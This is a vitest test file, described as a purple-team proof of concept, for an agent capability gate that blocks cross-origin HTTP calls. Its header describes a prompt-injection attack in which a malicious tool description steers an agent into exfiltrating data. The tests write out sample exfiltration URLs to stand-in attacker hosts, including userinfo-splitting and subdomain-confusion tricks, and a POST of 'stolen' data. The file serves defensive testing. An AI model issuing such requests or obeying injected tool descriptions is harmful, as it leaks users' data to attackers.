/**
 * Purple-team PoC for `docs/purple-team/05-cross-origin-exfil.md`.
 *
 * Round 05 is the http-agent equivalent of round 01: a malicious tool
 * description tries to redirect a fully-cooperating agent to GET
 * attacker-controlled origins, exfiltrating data via the URL or query
 * string. capnagent's origin-bounded capability denies any GET whose
 * parsed `arg.origin` is not in the allowlist.
 *
 * Two layers of defense exist in production:
 *
 *   1. **The model itself** — modern Claude (Opus 4.5+, Sonnet 4.5+)
 *      is trained against this exact attack class and often refuses
 *      injected instructions. That's good, but it's not what this
 *      test is about.
 *   2. **capnagent's capability gate** — refuses out-of-allowlist
 *      `http.get` calls regardless of model behavior. That's what
 *      THIS test proves.
 *
 * The point of the purple-team framing: capnagent's claim does NOT
 * depend on the model's robustness. Even if a future model regression
 * makes injection trivially successful, the origin boundary holds.
 *
 * # The URL-parsing Context normalizer
 *
 * The `Context` provider (in `index.ts`) parses `arg.url` with the
 * standard `URL` constructor and writes the parsed origin into
 * `arg.origin` BEFORE the verifier sees it. The caveat compares
 * against `arg.origin` (the parsed value), not `arg.url` (the raw
 * input). This is what defends against userinfo splitting and
 * subdomain confusion: those tricks fool a substring/regex check on
 * the raw input, but `URL.origin` returns the *real* host the request
 * would actually go to.
 *
 * If `arg.url` fails to parse (malformed URL or non-string), the
 * normalizer leaves `arg.origin` unset and the equality caveat fails
 * closed — denied without ever calling fetch.
 *
 * # Why we don't actually exfil to a real attacker host
 *
 * If capnagent's gate were ever broken, this test would actually
 * issue requests to `https://api.attacker.com/exfil`. That's an
 * unacceptable risk for a CI test. We use a localhost-bound
 * rewriting fetch stub: the verifier sees the agent's claimed public
 * origin, but if (and ONLY if) the gate lets a request through, fetch
 * hits a known-good 127.0.0.1 test server. Same structural test, no
 * possibility of real harm if a regression slips through.
 */

import {
  type IncomingMessage,
  type Server,
  type ServerResponse,
  createServer as createHttp,
} from "node:http";
import type { AddressInfo } from "node:net";
import { afterAll, beforeAll, beforeEach, describe, expect, it } from "vitest";

import { init } from "@capnagent/core";
import { CapabilityDeniedError } from "@capnagent/mcp";

import {
  type GuardedHttpClient,
  createGuardedHttpClient,
  issueOriginScopedGetCapability,
} from "../index.js";

const CALLER = "agent:http";

// Public-facing origins the agent thinks it's calling. The capability
// is scoped to PUBLIC_GOOD; PUBLIC_BAD is what the malicious tool
// description tries to redirect the agent to.
const PUBLIC_GOOD = "https://api.example.com";
const PUBLIC_BAD = "https://api.attacker.com";

// Two userinfo / subdomain attack origins. They never need a localhost
// mapping because the gate is supposed to deny them BEFORE fetch runs;
// if a regression let one through, the rewriting fetch stub throws
// loudly so the test fails clearly rather than silently exfiltrating.
const USERINFO_HOST_THE_AGENT_PASSES = "https://api.example.com@evil.com/exfil";
const SUBDOMAIN_CONFUSION_URL = "https://api.example.com.attacker.com/exfil";

interface TestServer {
  base: string;
  hits: Array<{ url: string; method: string }>;
  close: () => Promise<void>;
}

async function startTestServer(): Promise<TestServer> {
  const hits: Array<{ url: string; method: string }> = [];
  const server: Server = createHttp((req: IncomingMessage, res: ServerResponse) => {
    hits.push({ url: req.url ?? "", method: req.method ?? "" });
    res.writeHead(200, { "content-type": "text/plain" });
    res.end(`hit ${req.method} ${req.url}`);
  });
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  const addr = server.address() as AddressInfo;
  const base = `http://127.0.0.1:${addr.port}`;
  return {
    base,
    hits,
    close: () => new Promise((resolve) => server.close(() => resolve())),
  };
}

/**
 * fetch stub that lets the AGENT see one URL (the public-facing origin
 * the capability scopes) while the actual HTTP request hits the
 * localhost test server. Mirrors the pattern in `http.test.ts`.
 *
 * If the gate ever lets a non-mapped origin through, the stub throws
 * — that's a security regression we WANT to be loud about.
 */
function makeRewritingFetch(public2local: Record<string, string>): typeof fetch {
  return (async (input: Parameters<typeof fetch>[0], init?: RequestInit): Promise<Response> => {
    const url = typeof input === "string" ? input : input.toString();
    const u = new URL(url);
    const localBase = public2local[u.origin];
    if (!localBase) {
      throw new Error(
        `SECURITY REGRESSION: fetch stub reached for origin ${u.origin} — capnagent's gate should have denied this call before fetch ran.`,
      );
    }
    const rewritten = `${localBase}${u.pathname}${u.search}`;
    return await fetch(rewritten, init);
  }) as typeof fetch;
}

let goodServer: TestServer;

beforeAll(async () => {
  await init();
  goodServer = await startTestServer();
});

afterAll(async () => {
  await goodServer.close();
});

interface PurpleHarness {
  guarded: GuardedHttpClient;
}

async function makeHarness(): Promise<PurpleHarness> {
  const cap = issueOriginScopedGetCapability({
    allowedOrigins: [PUBLIC_GOOD],
    caller: CALLER,
  });
  // Only the GOOD origin gets a localhost mapping. If the gate were
  // somehow tricked into letting an attacker URL through, fetch would
  // throw on the missing mapping — making the regression loud rather
  // than silent.
  const fetchStub = makeRewritingFetch({
    [PUBLIC_GOOD]: goodServer.base,
  });
  const guarded = await createGuardedHttpClient({
    capability: cap,
    caller: CALLER,
    fetch: fetchStub,
  });
  return { guarded };
}

let h: PurpleHarness;

beforeEach(async () => {
  h = await makeHarness();
  goodServer.hits.length = 0;
});

describe("purple-team 05: cross-origin exfil via http-agent", () => {
  describe("structural defense (worst-case: model fully cooperates with injection)", () => {
    it("negative hypothesis — direct GET to allowlisted origin succeeds and reaches the stub", async () => {
      // The defense is not "deny everything that mentions attacker.com."
      // Legitimate in-allowlist GETs MUST still work, otherwise the
      // round isn't a win.
      const result = (await h.guarded.client.callTool("http.get", {
        url: `${PUBLIC_GOOD}/data`,
      })) as { status: number; body: string };
      expect(result.status).toBe(200);
      expect(result.body).toBe("hit GET /data");
      expect(goodServer.hits.map((x) => x.url)).toEqual(["/data"]);
    });

    it("GET to a non-allowlisted attacker origin is denied — fetch never runs", async () => {
      // Stage 3 of the analogous attack: the compromised agent emits
      // an http.get to the attacker's exfil endpoint. capnagent's
      // origin-bounded cap should deny BEFORE fetch runs.
      await expect(
        h.guarded.client.callTool("http.get", { url: `${PUBLIC_BAD}/exfil` }),
      ).rejects.toBeInstanceOf(CapabilityDeniedError);
      expect(goodServer.hits).toEqual([]);
    });

    it("userinfo splitting (https://api.good.com@evil.com/x) is denied — parsed origin is the REAL host", async () => {
      // Classic URL-parsing confusion: a substring check on the raw
      // input might see `api.example.com` and let it through. The
      // standard `URL` constructor parses the userinfo correctly, so
      // `URL.origin` is `https://evil.com` — not in the allowlist,
      // denied.
      await expect(
        h.guarded.client.callTool("http.get", { url: USERINFO_HOST_THE_AGENT_PASSES }),
      ).rejects.toBeInstanceOf(CapabilityDeniedError);
      expect(goodServer.hits).toEqual([]);

      // Sanity check: confirm what `new URL().origin` actually returns
      // for the userinfo-splitting input. If a future Node version
      // changed URL parsing semantics, this assertion would fail
      // loudly — we'd want to know about that.
      expect(new URL(USERINFO_HOST_THE_AGENT_PASSES).origin).toBe("https://evil.com");
    });

    it("subdomain confusion (https://api.good.com.attacker.com/x) is denied — parsed origin is the attacker subdomain", async () => {
      // The attacker registers `attacker.com` and creates a subdomain
      // `api.example.com.attacker.com`. A naive `endsWith` or substring
      // check might see "api.example.com" and pass. `URL.origin`
      // correctly returns `https://api.example.com.attacker.com`,
      // which is not equal to `https://api.example.com`.
      await expect(
        h.guarded.client.callTool("http.get", { url: SUBDOMAIN_CONFUSION_URL }),
      ).rejects.toBeInstanceOf(CapabilityDeniedError);
      expect(goodServer.hits).toEqual([]);

      expect(new URL(SUBDOMAIN_CONFUSION_URL).origin).toBe("https://api.example.com.attacker.com");
    });

    it("malformed URL is denied — no arg.origin set, equality fails closed", async () => {
      // The Context normalizer parses `arg.url`. If parsing throws,
      // it leaves `arg.origin` unset; the caveat then compares an
      // undefined field against the allowlist string and fails. The
      // call is denied without ever hitting fetch.
      await expect(
        h.guarded.client.callTool("http.get", { url: "not a url" }),
      ).rejects.toBeInstanceOf(CapabilityDeniedError);
      expect(goodServer.hits).toEqual([]);
    });

    it("non-string url is denied — Context normalizer leaves arg.origin unset", async () => {
      // The agent (or a malicious description trying to confuse the
      // gate) passes `url: 42`. The normalizer's typeof check returns
      // early without setting `arg.origin`; equality fails closed.
      await expect(h.guarded.client.callTool("http.get", { url: 42 })).rejects.toBeInstanceOf(
        CapabilityDeniedError,
      );
      expect(goodServer.hits).toEqual([]);
    });

    it("POST to allowlisted origin is denied — no clause permits POST", async () => {
      // Variant of cross-tool hijack: the malicious description tells
      // the agent to POST stolen data to the legit origin (perhaps
      // hoping the operator runs a write-accepting endpoint there).
      // The issued capability only mentions http.get; http.post has
      // no allow clause and fails closed.
      await expect(
        h.guarded.client.callTool("http.post", {
          url: `${PUBLIC_GOOD}/exfil`,
          body: '{"stolen":"data"}',
        }),
      ).rejects.toBeInstanceOf(CapabilityDeniedError);
      expect(goodServer.hits).toEqual([]);
    });

    it("multi-step attack: legit GET succeeds, follow-up out-of-origin GET fails — only the legit one reaches the stub", async () => {
      // Real-world attack pattern: the agent does some legitimate
      // work first (so the user sees normal behavior), THEN tries
      // the exfil. capnagent denies only the second.
      const legit = (await h.guarded.client.callTool("http.get", {
        url: `${PUBLIC_GOOD}/v1/items`,
      })) as { status: number; body: string };
      expect(legit.status).toBe(200);
      expect(legit.body).toBe("hit GET /v1/items");

      await expect(
        h.guarded.client.callTool("http.get", { url: `${PUBLIC_BAD}/exfil?stolen=secret` }),
      ).rejects.toBeInstanceOf(CapabilityDeniedError);

      // Exactly the legit call reached the underlying client.
      expect(goodServer.hits.map((x) => x.url)).toEqual(["/v1/items"]);
    });
  });

  describe("audit trail (every denial is auditable)", () => {
    it("denial receipts have outcome.kind === 'denied' with reason matching /caveat failed/ and a v0.2-versioned, HMAC-signed envelope", async () => {
      await expect(
        h.guarded.client.callTool("http.get", { url: `${PUBLIC_BAD}/exfil` }),
      ).rejects.toBeInstanceOf(CapabilityDeniedError);

      expect(h.guarded.receipts).toHaveLength(1);
      const r = h.guarded.receipts[0] as {
        version: number;
        outcome: { kind: string; reason: string };
        signature: string;
      };
      expect(r.version).toBe(1);
      expect(r.outcome.kind).toBe("denied");
      expect(r.outcome.reason).toMatch(/caveat failed/);
      expect(r.signature.length).toBeGreaterThan(0);
    });

    it("a sequence of attack attempts produces one signed receipt per attempt", async () => {
      // Attacker probes multiple exfil URLs across multiple bypass
      // techniques; each attempt is a separate audit-loggable event.
      const targets = [
        `${PUBLIC_BAD}/exfil`,
        USERINFO_HOST_THE_AGENT_PASSES,
        SUBDOMAIN_CONFUSION_URL,
      ];
      for (const t of targets) {
        await expect(h.guarded.client.callTool("http.get", { url: t })).rejects.toBeInstanceOf(
          CapabilityDeniedError,
        );
      }
      expect(h.guarded.receipts).toHaveLength(3);
      for (const r of h.guarded.receipts) {
        const rec = r as { outcome: { kind: string; reason: string }; signature: string };
        expect(rec.outcome.kind).toBe("denied");
        expect(rec.outcome.reason).toMatch(/caveat failed/);
        expect(rec.signature.length).toBeGreaterThan(0);
      }
    });
  });

  describe("residual risk (honest acknowledgment of what this defense does NOT cover)", () => {
    it("an in-scope GET to a path named /exfil INSIDE the allowlisted origin is allowed — capnagent gates origin, not path", async () => {
      // capnagent's origin caveat is intentionally path-agnostic. If
      // an operator wants to additionally deny specific paths within
      // an allowed origin (e.g. block `/admin` even on api.example.com),
      // they must add another caveat clause. This test pins that
      // residual-risk acknowledgment so a future change that silently
      // started gating paths would surface here.
      const result = (await h.guarded.client.callTool("http.get", {
        url: `${PUBLIC_GOOD}/exfil?stolen=data`,
      })) as { status: number; body: string };
      expect(result.status).toBe(200);
      expect(result.body).toBe("hit GET /exfil?stolen=data");
      expect(goodServer.hits.map((x) => x.url)).toEqual(["/exfil?stolen=data"]);
    });
  });
});
